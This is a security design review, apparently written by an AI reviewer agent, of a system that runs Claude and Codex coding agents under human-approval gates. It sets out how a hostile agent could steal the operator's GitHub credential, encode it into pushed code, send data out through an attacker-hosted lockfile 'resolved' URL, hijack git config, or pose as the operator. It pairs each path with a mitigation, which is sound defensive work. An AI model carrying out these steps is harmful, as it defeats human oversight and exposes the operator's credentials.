# Phase 3 Cross-Agent Review — Agent E (Application Security Architect)

| Field | Value |
|---|---|
| Reviewer | Agent E, independent security review of every Phase 2 design |
| Date | 2026-10-12 |
| Review focus | Are the SEC requirements and the "requirements imposed on A/B/C/D/F" (`security/threat-model.md` §5, §11) actually satisfied by the other designs? Which new attack paths do those designs create? Does the human-approval-boundary proof (threat-model §5.2) still hold against the designs as written? |
| Status | Design review only. No file other than this one was changed. Nothing was executed against GitHub, Linear or the Mac. |

---

## 1. Scope and method

**Read in full:**
- `reviews/00-brief.md`, `03-design-baseline.md`;
- all six Phase 2 reports (`10`–`15`);
- `security/threat-model.md` (my own; re-read against the designs);
- `architecture/decisions/ADR-008`, `ADR-010`, `ADR-011`;
- `integrations/codex.md`, `integrations/claude.md` §1–§9;
- `integrations/github.md` §1–§10;
- `architecture/state-machine.md` §3–§8;
- `architecture/components.md` §4.16–§4.17, §5, §6.3 (authority, audit and control tables), §6.4, §8, §9;
- `operations/macos-service.md` §1, §3, §6, §7, §9, §11–§15, §16 (partial);
- `operations/recovery.md` §4–§5.

**Read in targeted sections (Grep plus offset reads):**
- `architecture/overview.md` §5.2–§5.4, §6, §7, §8 (authorization integrity), §12;
- ADR-004/005/006;
- `integrations/linear.md` §1–§2, §4, §6–§10;
- `protocols/messages.md` §1, §5 (validation table);
- every `protocols/schemas/output.*.json` (binding fields extracted programmatically), `envelope.schema.json`;
- `planning/traceability.md` SEC rows and RTM;
- `testing/verification-plan.md` L12–L14, TC-SEC/TC-GOV/TC-PI catalogues, milestone gates.

**Method:**
1. Built a requirement-by-requirement compliance matrix for SEC-100…905 and for A-SEC/B-SEC/C-SEC/D-SEC/F-SEC (§3.1–§3.2).
2. Re-ran the §5.2.2 proof path by path against the designs as written (§3.3).
3. Searched for new attack paths created by the other agents' choices, focused on:
   - the control socket and its principals;
   - detached and re-attached processes;
   - the `runwrap` and `exit.json` files;
   - the public heartbeat and ops issues and the Actions watchdog;
   - the five different work roots;
   - Claude's Read scope over git-worktree checkouts;
   - the `mercury` CLI used by an interactive Claude session;
   - test and dependency commands run by the coordinator outside the Codex sandbox;
   - git invocations inside agent-writable worktrees;
   - credential delivery to git (§3.4).

**Status legend:**

| Code | Meaning |
|---|---|
| **S** | Satisfied |
| **P** | Partial |
| **M** | Missing |
| **X** | Contradicted (a design states the opposite) |
| **D** | SHOULD, deferred with an acceptable reason |

---

## 2. Summary verdict

**Verdict: NOT YET SECURE. Do not run agents with real repositories on the operator's Mac until RE-01 to RE-07 are resolved.**

The GitHub-side half of the design is sound and in places stricter than my threat model:
- B's ruleset, App permission minimisation, COMMENT-only reviews, the required `MERCURY / claude-review` check pinned to the App, and the numeric-ID merge verification M1–M7;
- C's binding fields, append-only triggers and derived review validity;
- A's single-writer Decision Recorder.

Prompt-level failures of Claude cannot produce a counting approval or a merge.

The local half contradicts the threat model's central premise. **Every design runs Claude, Codex, the L2 test runner and `deps_install` as the operator's macOS user, with `HOME` set to the operator's home** (overview §5.3; codex.md §6; claude.md §7.2; macos-service §9.4; components §5.2). Seatbelt allows broad reads (ASM-E-15).

So a hostile Codex run (an *in-scope* adversary) can:
- read the operator's GitHub admin credential: `~/.config/gh/hosts.yml`, or the `gh` Keychain item through `/usr/bin/security`;
- stage it in an encoded form that no pattern or exact-match secret scanner can catch;
- have the coordinator push it to a **public** branch.

That is human impersonation. It defeats path 3 of the proof ("weakening the rules") and makes the GitHub layers moot.

My own threat model's single-failure table (§5.2.2, row "SEC-201 failure alone → Yes, pre-push secret scan") is **wrong** for encoded secrets. I correct it here (RE-24).

**Recommended resolution (RE-01): a dedicated macOS user account for the whole MERCURY stack (option U2).**
- Coordinator, agents, tests, worktrees and MERCURY's own Keychain all live in a login session of a `mercury` user that holds no human credentials.
- This satisfies the critical property of SEC-201 (agents cannot reach Zone H).
- It keeps C's and D's same-uid process-group model inside that account.
- It answers A's objection (§8.6), because the `mercury` user has its own login Keychain and its own `gui/<uid>` LaunchAgent domain.

The stricter variant (agent uid ≠ coordinator uid, U1) becomes a SHOULD.

**Counts:** 1 Critical, 7 High, 18 Medium, 3 Low (29 findings).

| | Satisfied | Partial | Missing | Contradicted | Deferred | Total |
|---|---|---|---|---|---|---|
| SEC-1xx…9xx catalogue | 19 | 38 | 8 | 8 | 2 | 75 |
| Agent requirements (A/B/C/D/F-SEC) | 6 | 16 | 3 | 2 | — | 27 |

---

## 3. Findings

### 3.1 SEC requirement compliance matrix

Locations use these abbreviations:

| Abbreviation | Document |
|---|---|
| OV | `architecture/overview.md` |
| CMP | `architecture/components.md` |
| SM | `architecture/state-machine.md` |
| CX | `integrations/codex.md` |
| CL | `integrations/claude.md` |
| GH | `integrations/github.md` |
| LN | `integrations/linear.md` |
| MS | `operations/macos-service.md` |
| RC | `operations/recovery.md` |
| VP | `testing/verification-plan.md` |
| TR | `planning/traceability.md` |
| MSG | `protocols/messages.md` |

#### SEC-1xx Identity and governance

| ID | St. | Where it is (or is not) met | Gap / note | Finding |
|---|---|---|---|---|
| SEC-100 | P | GH §9.1 ruleset: PR, code owners, last-push, stale dismissal, empty bypass, `non_fast_forward`, deletion, strict checks. ADR-008 §Protection | No `mercury/policy` required context. Thread resolution is off (SHOULD; OQ-B-08) | RE-05 |
| SEC-101 | P | GH §2.1: no admin or workflows | Three different permission sets across ADR-008, GH §2.1, MS §11.4 and TM §6.2 (checks, statuses, issues) | RE-10 |
| SEC-102 | S | GH GH-2/GH-3 (COMMENT-only, stricter than SEC-102); SM I9 | SM T25 still posts `REQUEST_CHANGES` | RE-15 |
| SEC-103 | X | GH GH-5 (the coordinator never uses `gh`) | Agents run with the operator's `HOME`. MS §1 says the LaunchAgent "gets the user's git, Claude and Codex configuration" | RE-01 |
| SEC-104 | S | GH §9.3, ADR-008 | — | — |
| SEC-105 | P | GH §9.3: approve-PR off, fork approval | Missing: default `GITHUB_TOKEN` read-only, no PR-reachable secrets, environments | RE-17 |
| SEC-106 | P | LN §9 (disable coding sessions) | 2FA, no plaintext classic PAT, no Linear merge, and "the operator's own agents must not approve or merge" are not in any Phase 0 checklist | RE-08 |
| SEC-107 | S | GH GH-7 (numeric IDs) | — | — |
| SEC-108 | P | GH §9 (every 6 h; refuse new PRs for the repo) | Cadence is not ≤ 60 min. Actions settings, App permissions and collaborators are not checked. The response is not a global halt plus SECURITY notification | RE-17 |
| SEC-109 | P | ADR-008 G-1/G-2; GH §10 | No G-SPLIT. G-1 (detective) is the MVP default without a written risk-acceptance requirement | §4 (6) |
| SEC-110 | D | ADR-008 (second App optional) | Acceptable for v1 | — |
| SEC-111 | S | GH §4.2 (bot author, `Mercury-*` trailers) | — | — |
| SEC-112 | M | — | No tag ruleset | RE-17 |

#### SEC-2xx Agent isolation

| ID | St. | Where | Gap | Finding |
|---|---|---|---|---|
| SEC-201 | **X** | OV §5.3, §8.6; ADR-010/011; CX §5–§6 (`HOME` = operator, ASM-B-15); CL §7.2; MS §7, §9.4; CMP §5.2 | Same uid as the operator, reads not denied. The interim deny-read fallback exists only as an "if supported" option (ASM-B-14). No ADR (A-SEC-2) | **RE-01** |
| SEC-202 | P | CX §6, CL §7.2, MS §9.4 env allowlists | `HOME` = operator home. Claude gets `ANTHROPIC_API_KEY` in env, not an agent-only `apiKeyHelper` | RE-01, RE-18 |
| SEC-203 | P | CX §3, §5 flags and config | `CODEX_HOME` is per task in CX §5 and CMP §9.1 but per run in MS §7.1 (per run breaks resume). Three locations | RE-19 |
| SEC-204 | P | CL §2.1 SDK profile (`settingSources: []`, `mcpServers: {}`, `disableAllHooks`, `dontAsk`, deny-all `canUseTool`) | Managed settings optional (CL §7.3, OQ-B-02). The `allowedTools` contract is ambiguous. It is unverified whether `disableAllHooks` also disables the SDK confinement hook | RE-18 |
| SEC-205 | **X** | CL §3.2, CMP §9.4 use `git worktree add --detach` checkouts | Symlinks are materialised, a `.git` file is present, attributes are applied, and the checkout is owner-writable | RE-06 |
| SEC-206 | M | — | No egress control for agents or `deps_install` | RE-02 |
| SEC-207 | P | Per-run `TMPDIR` (CX, CL, MS) | Run dirs are kept 14–30 days (CMP §6.5, MS §11.1). Acceptable if under U2 | — |
| SEC-208 | P | CX §2 argv linter; ADR-005 | Managed `requirements.toml` not specified (ASM-E-10) | RE-18 |
| SEC-209 | P | CX §9 diff guard rejects edits to instruction files | No byte-equality check before a **resume** on top of partial edits (CX §12 "resume is the default after stalled") | RE-23 |
| SEC-210 | P | CL §8, CX §13 version pins | SHA-256 of the agent binaries is not checked (only Node's, MS §7.1) | RE-18 |
| SEC-211 | S | CX §1 CX-4 (Codex never gets network) | The `deps_install` network is a separate problem (SEC-703) | RE-02 |

#### SEC-3xx Prompt injection and decision validation

| ID | St. | Where | Gap | Finding |
|---|---|---|---|---|
| SEC-301 | S | CL §5.2, CX §4 (nonce, provenance, escaping) | — | — |
| SEC-302 | S | SM I17, MSG §1 rule 4, LN LN-1 | — | — |
| SEC-303 | S | All `output.*` schemas: `additionalProperties:false`, enums, bounds; MSG §5 `files_reviewed ⊇ changed` | — | — |
| SEC-304 | **M** | — | No `@mention`, closing-keyword or Linear magic-word neutralisation. The PR body includes the Codex summary (GH §5.1) | RE-12 |
| SEC-305 | S | MSG §5 row `task_authorization_decision`; schema `dependency_changes_allowed ∈ {false,"escalate"}` | The semantics of `"escalate"` are undefined downstream | RE-05 |
| SEC-306 | S | SM §8.2, CMP triggers I4/I5, `trg_runs_impl_binding` | MAC part optional (SEC-603) | RE-09 |
| SEC-307 | P | SM §5 `spec_changed` hold; §8.1 | Not re-checked at T22/T24 (before PR review). GH §6 uses `action_required` only | RE-14 |
| SEC-308 | S | Schema binding (`head_sha`, `base_sha`, `diff_sha256`); SM §8.3; CMP §10.5 `commit_id = head_sha` | — | — |
| SEC-309 | P | CX §9 diff guard and gitleaks; results passed to Claude (CL §4) | No Unicode/bidi scan, no case-collision check, no `mercury/policy` status | RE-05, RE-23 |
| SEC-310 | **X** | CX §9 blocks many paths (stricter) | Lockfiles and manifests are allowed when **Claude's** approved plan lists them. `package.json` scripts, Dockerfile, Makefile, build scripts and security modules are neither blocked nor escalated. No escalation label or acknowledgement. No required `mercury/policy` | RE-05 |
| SEC-311 | P | VP L14 (≥ 50 cases, ≥ 80% detection) | TM SAC-04 says ≥ 60 cases and ≥ 95%; not gated on agent upgrades | RE-20 |
| SEC-312 | M | — | No bidi, zero-width or mixed-script checks | RE-23 |
| SEC-313 | P | GH §7.2–§7.3 (operator numeric ID for `CHANGES_REQUESTED`) | Inline review comments are fetched without an explicit author filter (GH §7 table). SM T32 / OD-C-03 label path | RE-21 |
| SEC-314 | P | Separate code and security runs, security review mandatory per PR (CL §3; SM T24) | PR review inputs include the "Codex final message" (CL §4) | RE-21 |
| SEC-315 | S | SM §9 (3/3/3/5) | "Identical findings count double" is missing (minor) | — |

#### SEC-4xx Filesystem and git

| ID | St. | Where | Gap | Finding |
|---|---|---|---|---|
| SEC-401 | P | CX §9 step 5 (`hooksPath`, `fsmonitor`, `GIT_CONFIG_GLOBAL=/dev/null`); CMP §9.2–§9.3 | Most of the flag set is missing (`protocol.*`, `attributesFile`, `--no-textconv`, `url.*` defence). `git status`/`diff` in CX §9 step 1 are unhardened | RE-03 |
| SEC-402 | **M** | — | No config-key allowlist and no verification of the worktree `.git` pointer | RE-03 |
| SEC-403 | P | CX §9 (escaping symlinks, `**/.git*`, submodules) | Missing: `..` components, APFS case collisions | RE-23 |
| SEC-404 | P | CL CL-3 realpath (Claude only) | Coordinator `O_NOFOLLOW` / `lstat` and plan-path canonicalisation are not specified | RE-23 |
| SEC-405 | **X** | MS §7 (single uid, 0700) | No agent group or ownership split | RE-01 |
| SEC-406 | P | CMP trigger I14 (archive plus terminal) | Realpath-under-root and no-follow removal not stated | RE-23 |

#### SEC-5xx Secrets

| ID | St. | Where | Gap | Finding |
|---|---|---|---|---|
| SEC-501 | P | CMP §4.16; MS §11.1 redactors; CL §5.2 rule 4 | No entropy stage for public sinks, no fail-closed public sinks, no `Redacted<string>` typing (C-SEC-7) | RE-12 |
| SEC-502 | P | CX §9 step 3 (gitleaks plus patterns; blocks and escalates) | Cannot detect encoded secrets the coordinator does not hold (operator credentials) | RE-01, RE-24 |
| SEC-503 | P | MS §9 Keychain, no argv or plist | ACL `-T /usr/bin/security` means any same-uid process can read the App key. Signed helper is v2 | RE-29 |
| SEC-504 | P | GH §3 rotation; CL §7.1 and CX §7 dedicated projects and caps | No credential-age alarm | — |
| SEC-505 | S | CMP §8.1 `spec.json` (env names only, redacted argv) | Raw stdout stays local, unredacted, 0600, 14 days: accepted under conditions (§4 item 13) | — |
| SEC-506 | M | — | Secret scanning and push protection on target repos not listed in GH §9.3 | RE-17 |

#### SEC-6xx Audit

| ID | St. | Where | Gap | Finding |
|---|---|---|---|---|
| SEC-601 | P | CMP §6.3 `audit_log`, §6.4 append-only triggers; envelope `actor` | The audit actor for the `claude_session` principal is undefined (it is recorded as `operator`?) | RE-04 |
| SEC-602 | P | CMP §4.16 chain (JCS) plus linkage trigger | Startup and daily verification are absent from RC §4. A chain failure halts only per task (SM `guard_integrity_failure`) | RE-09 |
| SEC-603 | **X** | OV §8.6, ADR-011 §8, CMP DDL `record_mac` nullable: "optional" | See revised position §4 (3) | RE-09 |
| SEC-604 | **M** | — (ADR-011 §7 back-references only) | No anchors table, no anchor write | RE-09 |
| SEC-605 | P | CMP §5.4 `audit.verify` | No comparison against anchors | RE-09 |
| SEC-606 | S | CMP §6.5, MS §11.1 | — | — |

#### SEC-7xx Supply chain and resources

| ID | St. | Where | Gap | Finding |
|---|---|---|---|---|
| SEC-701 | P | MS §13.5, CL §8, CX §13 (version pins, auto-update off) | No hash pins for agent CLIs | RE-18 |
| SEC-702 | **X** | CX §9 "lockfile changes unless the approved plan lists dependency changes" | Claude clears dependency changes. No lockfile lint (registry allowlist, `integrity`, no `git+`/`file:`/`http:`) | RE-05 |
| SEC-703 | **X** | CX §10 `deps_install`: network on, same uid, real `HOME`, before human acknowledgement; lifecycle scripts can be allowlisted per repo | Egress unrestricted; installs Claude-approved lockfiles | RE-02 |
| SEC-704 | P | CMP §8.4–§8.5, MS §10 (deadlines, group kill, output caps, RSS sampling) | No `NPROC`/`FSIZE` rlimits (`runwrap` could set them) | RE-07 |
| SEC-705 | M | — | No external mutation budgets | RE-17 |
| SEC-706 | S | MS §15.1 supply-chain job, `--ignore-scripts`, SHA-pinned actions | — | — |
| SEC-707 | D | MS §15.2 optional policy workflow | SHOULD | — |

#### SEC-8xx Linear

| ID | St. | Where | Gap | Finding |
|---|---|---|---|---|
| SEC-801 | P | LN §2 (`actor=app` client credentials; personal key rejected) | The token reaches all public teams, not only MERCURY teams. ASM-E-05 (app actor cannot merge via Linear) is not tracked | RE-22 |
| SEC-802 | S | CL §2.1 `mcpServers: {}`; CX §5 no MCP | ASM-E-11 not in the Phase 0 lists | RE-22 |
| SEC-803 | P | LN §9 (delegate and coding-session detection) | A foreign PR for a managed issue → BLOCKED plus SECURITY is not specified (only foreign *push*) | RE-22 |
| SEC-804 | S | LN §9 operator recommendation; overrides only via CLI | — | — |
| SEC-805 | S | LN §7.1 exhaustive write table | Needs a static test like SEC-102 | — |
| SEC-806 | S | ADR-012; F M9-4 (revoke token) | — | — |

#### SEC-9xx Detection and response

| ID | St. | Where | Gap | Finding |
|---|---|---|---|---|
| SEC-901 | P | SM notifications; GH §8 PR comment plus Linear; MS §11.4 ops issue | B's App has `issues: none`, so the "issue in MERCURY repo" channel is impossible as specified | RE-10 |
| SEC-902 | P | CMP §5.4 `pause --all` (operator_pause hold) | No halt file. No global auto-pause on SECURITY incidents. Pause does not stop detached runs | RE-25, RE-07 |
| SEC-903 | P | CX §8 (MCP or web events kill the run); CL §6 V4 (> 5 path denials) | No Codex `command_execution` denial counting; no Seatbelt log capture | RE-23 |
| SEC-904 | P | SM §8.3 (head = local head) | "All commits bot-authored, parents chain from base" is not checked (matters after `--adopt`) | RE-16 |
| SEC-905 | P | GH §8 M1–M7 (strong, numeric IDs, tree compare) | SM §8.5 compares **login**, lacks M7 and "no MERCURY APPROVED review". Neither audits commits on `main` that are not tied to a verified merge | RE-16 |

### 3.2 Requirements imposed on other agents (threat-model §11)

| ID | St. | Evidence | Finding |
|---|---|---|---|
| A-SEC-1 Merge-actor ADR | P | ADR-008 G-1/G-2 only; no G-SPLIT; no written risk acceptance | §4 (6) |
| A-SEC-2 Separate-uid ADR | **M** | None. OV §8.6 and ADR-010/011 record the opposite position | RE-01 |
| A-SEC-3 Trust zones H/C/A | **X** | OV §5.3 puts T2/T3 inside the operator account | RE-01 |
| A-SEC-4 Text is never control | S | OV AP-7, §9; SM I17 | — |
| A-SEC-5 Fail-closed (DB, drift, chain) | P | DB → safe mode (RC FM-09). Drift → per-repo PR refusal. Chain → per-task only | RE-09, RE-17 |
| B-SEC-1 Claude profiles | P | CL §2 complete except managed settings and `allowedTools` | RE-18 |
| B-SEC-2 Codex invocation | P | CX §3, §5. `HOME` = operator | RE-01 |
| B-SEC-3 Endpoint allowlist | S | GH GH-2/GH-3 | — |
| B-SEC-4 Identity per mode, statuses | P | No G-SPLIT, no `mercury/policy` | RE-05, RE-10 |
| B-SEC-5 Linear app and allowlist | S | LN §2, §7, §9 | — |
| B-SEC-6 Merge verification and provenance | S | GH §8, GH-7 | — |
| C-SEC-1 Binding echoes | S | Schemas (extracted): code review echoes all 12 fields; security review echoes 9 (no spec or plan hash, acceptable) | — |
| C-SEC-2 One-transaction dispatch guard | P | SM §8.1–§8.2, CMP §7.2. MAC optional | RE-09 |
| C-SEC-3 Pre-check guard and escalation | P | Gates before commit (T15/T18/T19); `security_escalation` reason. No "escalation acknowledged" guard | RE-05 |
| C-SEC-4 Audit, HMAC, anchors | P | Chain and triggers yes; HMAC optional; anchors table missing | RE-09 |
| C-SEC-5 Actor and display-only fields | S | Envelope `actor`; MSG §1 rule 4 | — |
| C-SEC-6 Loop bounds and comment allowlist | P | Bounds yes; ingestion filter not explicit | RE-21 |
| C-SEC-7 `Redacted<string>` sinks | P | Redactor yes; type-level enforcement not adopted | RE-12 |
| D-SEC-1 Agent uid, wrapper, modes | **X** | MS §7: single uid | RE-01 |
| D-SEC-2 Keychain and `apiKeyHelper` | P | Keychain yes; `-T /usr/bin/security`; API key in env | RE-29 |
| D-SEC-3 Limits and orphan sweep | P | Group kill and sweep yes; rlimits sampled only | RE-07 |
| D-SEC-4 Pins, managed settings | P | Version pins; no hash pins; managed settings not installed | RE-18 |
| D-SEC-5 Kill switch; re-verify MAC and chain at recovery | P | Pause yes; RC §4 does not verify the chain or MACs | RE-09 |
| D-SEC-6 Phase 0 includes ASM-E and SEC-T-20 | P | Only E5 (Keychain probe on a MERCURY item) | RE-20 |
| F-SEC-1 Import SEC-xxx into the RTM | M | TR reserves SEC-001…089 with "TBD (E)" (F wrote before E) | RE-26 |
| F-SEC-2 Governance and SEC-T-16 before the first real task | P | P0 identities and governance yes; TC-SEC-005 (credential reads) only at M8, after real agent runs in M4–M7 | RE-20 |
| F-SEC-3 SAC-01…12 as gates | M | VP uses its own, weaker thresholds | RE-20 |

### 3.3 Re-evaluating the human-approval-boundary proof against the designs as written

Invariant H (threat-model §5.2): no agent- or coordinator-authored commit reaches a protected branch unless the operator approved that exact head after the last push.

| # | Path | Controls in the actual designs | Status |
|---|---|---|---|
| 1 | Direct push to `main` | App push token; GH §9.1 PR required, empty bypass, `non_fast_forward` | **Holds** (GH) |
| 2a | Agent or App approval counts | Apps cannot be code owners; GH-2 COMMENT only; last-push rule | **Holds** (GH plus SW) |
| 2b | TOCTOU / stale approval | GH §9.1 `dismiss_stale_reviews_on_push`, `require_last_push_approval`; SM §8.3 derived validity | **Holds** |
| 2c | Human approves misleading code | B's mandatory security review; required Claude check | **Weakened.** No `mercury/policy` escalation and no label: Claude alone clears dependency and build-script changes (RE-05). PR body carries unneutralised agent text (RE-12). Notification spoofing on the public ops issue (RE-11) |
| 2d | Non-human merge after approval | G-1: M2 detective only | **Detective** (as designed; operator decision) |
| 3 | Weaken rules (admin) | Needs the human's credential. **Agents run as the operator with the operator's `HOME`; Seatbelt allows reads; the `gh` token is reachable** (file, or Keychain via `/usr/bin/security` if the item ACL trusts it, ASM-E-16) | **BROKEN under one in-scope failure** (hostile Codex). Staging is via encoded content in the pushed diff (public repo) or via a `resolved` URL fetched by `deps_install`. No secret scanner can catch an encoding the coordinator does not know (RE-01, RE-02, RE-24) |
| 4 | Workflow with write power | App has no `workflows` permission (GH-rejected); CX §9 blocks `.github/**` | **Holds** for target repos. Partial for SEC-105 settings (RE-17) |
| 5 | Linear merge-as-human | MERCURY uses `actor=app`; agents have no MCP | **Holds for MERCURY credentials. Broken by path 3:** the operator's Linear key and MCP tokens in `~/.claude.json`-style configs are readable by agents |
| 6 | Same branch and unrelated merges | GH-7, foreign-push → BLOCKED | **Holds** |
| N1 | **Operator's own interactive agents** (Claude Code, Codex, IDE agents) holding the `usjbro` `gh` credential and reading MERCURY PRs or Linear comments | Nothing technical. GitHub cannot distinguish them from the human | **Open path** (pre-existing, but MERCURY feeds them untrusted text) (RE-08) |
| N2 | Coordinator git push redirected by a worktree `.git` pointer or config written by L2 test code | — | Leaks the **App** token, not the human's. Does not break H (App cannot approve) but grants App powers, including merging an approved PR under G-1 (RE-03) |
| N3 | Control-socket operator principal obtained by any same-uid process (token file readable; TTY default) | Policy only | Does not break H (no approve or merge method). Clears local security gates (escalation acknowledgement, `ack-merge`, unpause, `--adopt`) (RE-04) |

**Conclusion.** The proof sketch is valid for the GitHub layers (L3–L6). It **fails at L1** for the designs as written, because L1 was the only OS-enforced layer and no design implements it. The fix is RE-01 (U2 dedicated user), plus RE-02 and RE-03 so that no execution path combines "reads operator files" with "network or push". With RE-01 applied, path 3 returns to "Blocked by L1 (OS)". Path N1 then remains an operator-policy matter (RE-08).

### 3.4 Findings table

| ID | Sev. | Type | Location(s) | Finding | Recommended resolution | Owner |
|---|---|---|---|---|---|---|
| **RE-01** | **Critical** | security, contradiction | OV §5.3, §8.6; ADR-010 alternatives; ADR-011 "How much this matters"; CX §5–§6 (ASM-B-15 `HOME`=operator); CL §7.2; MS §1, §7, §9.4; CMP §5.2, §9.1; TM SEC-201, §11 A-SEC-2/D-SEC-1 | All agent, test and deps processes run as the operator's uid with the operator's `HOME`. Seatbelt reads are unrestricted (ASM-E-15). Codex can read `~/.config/gh/hosts.yml` or `~/.ssh`, the `gh` Keychain item (go-keyring items are typically created through `/usr/bin/security`: ASM-E-16), and MCP or connector tokens. It can then encode them into the diff, which is pushed to a public branch before any human looks. The secret scan (CX §9) cannot see encoded secrets it does not hold. Result: human impersonation, invariant H broken (§3.3 path 3). A's §8.6 frames separation as protecting **the DB from the operator**; the actual need is protecting **the operator's credentials from agents** | 1) New **ADR-013 "MERCURY runs in a dedicated macOS user" (U2)**. A standard, non-admin user `mercury` owns `mercuryd` (LaunchAgent in its own `gui/<uid>`), all agents, mirrors, worktrees, run dirs and its own login Keychain. It holds no human GitHub, Linear or SSH credential. It stays logged in via Fast User Switching (ASM-D-08); after a reboot the operator logs it in once (FileVault). 2) The operator's home is set to 0700 and verified from the `mercury` uid (ASM-E-04). 3) Defence in depth: Codex deny-read profile (ASM-B-14) for `/Users/<operator>` and `MERCURY_HOME/run`. 4) Release gate: **no real Codex, verify or deps run until SEC-T-20 passes** (canaries in the operator's home, the `gh` Keychain item, `~/.claude*`, `MERCURY_HOME/run/tokens`). 5) U1 (separate agent uid inside the stack via a root wrapper) is downgraded to SHOULD for v2; it protects the App key and control tokens. 6) Rewrite OV §5.3 to show zones H / C+A | A (ADR), D (layout, install, Phase 0), B (`HOME`, env), E (tests) |
| **RE-02** | High | security, infeasible-as-specified | CX §10 (L2 "Seatbelt profile… owned by E/D", `deps_install` "network on, no credentials"); CMP §8.2 "`sandbox-exec -f <profile>` or `codex sandbox macos`" (ASM-B-20, ASM-C-12); SM T14 (`deps_install` re-runs on every implementation round); GH §7.4 (base merge then L2) | Code that Codex authored (tests, `package.json` scripts behind `npm test`, lockfile contents) is executed **by the coordinator outside the Codex sandbox**. Problems: (a) the L2 profile is undesigned and has no fail-closed rule if neither sandbox mechanism exists, so implementers may run tests unsandboxed; (b) the profile does not deny reads of credentials or `MERCURY_HOME/run/tokens`, does not deny writes to `<wt>/.git`, and does not deny UNIX-socket connects; (c) `deps_install` runs with **unrestricted egress**, as the operator, with a lockfile that Claude (not the human) approved. A `resolved: https://<attacker>/<encoded-secret>` entry exfiltrates data with no lifecycle script at all. "Test commands come from MERCURY config" (CX §10) is illusory: `npm test` runs the worktree's `scripts.test` | **L2:** mandatory sandbox with no network, read-deny of the operator home and `MERCURY_HOME` except the worktree and toolchain, write-deny of `<wt>/.git`, no `unix-socket` outbound, rlimits. **Fail closed**: if no sandbox is available, L2 is skipped and recorded as `not_run`, and CI is the gate; never run unsandboxed. **`deps_install`:** (i) only from the base-branch lockfile, or from a lockfile change the human acknowledged (SEC-703); (ii) lockfile lint (registry allowlist, `integrity`, no `git+`/`file:`/`http:`/non-registry `resolved`) **before** any install; (iii) egress limited to registry hosts (pf anchor for the `mercury` uid, or a local allowlisting proxy, SEC-206); (iv) `--ignore-scripts` with no per-repo override in v1 (OQ-B-04 = no) | B (CX §10), D (profiles, pf), E (profile spec, tests SEC-T-71) |
| **RE-03** | High | security, missing-requirement | CX §9 steps 1, 5, 6; GH §3 (askpass or `GIT_CONFIG_COUNT` env); CMP §9.2 (askpass fd), §9.3; MS §9.3 (credential helper over the control socket with an env nonce); TM SEC-401/402 | Coordinator git commands run **inside agent-writable worktrees**. Two attacks follow. First, the worktree `.git` *file* (a `gitdir:` pointer) can be rewritten by L2 test code, or by Codex if its `.git` protection does not cover pointer files (ASM). Second, attacker git config (`core.fsmonitor`, `url.<evil>.insteadOf`, `include.path`, `credential.helper`) can then execute code as the coordinator, or redirect the push so that askpass hands the `contents:write` installation token to an attacker host. There are three incompatible credential-delivery designs. Env-based delivery (`GIT_CONFIG_VALUE_0`, `MERCURY_CRED_NONCE`) is visible to same-uid `ps -E` (ASM-B-16). D's socket helper turns the control socket into a token dispenser | 1) **Push from the coordinator-owned mirror by SHA** (`git -C <mirror> push https://github.com/<o>/<r>.git <sha>:refs/heads/mercury/…`), never from the worktree. 2) Before every git command in a worktree: verify the `.git` file equals the expected `gitdir:` line, and the gitdir config contains only allowlisted keys (SEC-402). 3) Full SEC-401 flag set on **every** git invocation, including `status` and `diff`. 4) Credentials only through C's fd-based askpass, scoped `credential.https://github.com.helper`. No env tokens, no socket dispensing. 5) Test SEC-T-41 extended: planted pointer and config | C (CMP §9), B (GH §3–§4), D (drop MS §9.3 socket helper) |
| **RE-04** | High | security | CMP §5.2 (token files 0600 under `run/tokens/`; `--as` default "operator when run from a TTY"; principal separation "policy-enforced"); MS §7.2 (peer-uid check only); OV §8.1 interactive Claude may request decisions | Any process of the uid can read `operator.token` or obtain a TTY (`script -q`), and so become `operator`: an interactive Claude Code session reading a malicious PR, L2 test code if UNIX connects are allowed (ASM-C-03), a compromised dependency. The operator principal can `ack-merge` (waive a merge-verification failure), `resume` `security_escalation` or `injection_suspected`, `resume --adopt` a foreign push, `grant` budgets, `unpause`, `outbox.retry` and `doctor --recheck`. These are exactly the local gates that should need a human. Invariant H still holds (no approve or merge method exists), but the escalation layer becomes software-optional | 1) Remove the TTY default; `--as` must be explicit. 2) A **human-presence tier** of methods (`ack-merge`, security acknowledgements including the SEC-310 acknowledgement, `resume` from `security_*`/`injection_suspected`/`merge_verification_failed`/`guard_integrity_failure`, `--adopt`, `grant`, `unpause` after an auto-pause) needs local user presence: Touch ID through a small signed LocalAuthentication helper, or the login password via `/usr/bin/security authorize`. The result is recorded in `control_requests`. 3) Under U2 (RE-01) the socket and tokens live in the `mercury` account; the operator's CLI talks to it through a group-readable socket owned by the `mercury` user (peer-uid = operator → `operator` principal **only with** a presence proof). 4) `claude_session` is the default for non-TTY peers; its notes stay untrusted (already so). 5) Audit actor `operator:presence` vs `operator:token` vs `claude_session` | C (CMP §5), D (helper, socket placement), E (method tier list) |
| **RE-05** | High | contradiction, security | TM SEC-310/702/309, §7.5; CX §9 step 2 ("lockfile changes unless the approved plan lists dependency changes"); SM T15/T18; GH §6 (only `MERCURY / claude-review` required); schema `dependency_changes_allowed: "escalate"` (semantics undefined in MSG/SM) | The deterministic escalation layer does not exist in the designs. Claude can clear dependency changes, and escalate-class paths (`package.json` scripts, Dockerfile, Makefile, build scripts, security-labelled modules) pass silently. No label, no human acknowledgement, no GitHub-enforced gate. This weakens path 2c and R-13 (dependency confusion) | Add a second required check **`MERCURY / policy`** (check run pinned to the App), computed only by deterministic pre-checks. `failure` on any escalate-class hit, cleared only by the human-presence acknowledgement (RE-04). Label `mercury:needs-human-security-review`. Define `"escalate"`: Codex may change dependencies only within the plan, the change is lint-checked, `MERCURY / policy` = failure until acknowledged, and no `deps_install` of the new lockfile before acknowledgement. Add the escalate list to CX §9. SM: guard on T24 that `policy` is `success` or acknowledged (C-SEC-3) | B (GH §6, §9.1; CX §9), C (SM guard, schema semantics), E (list) |
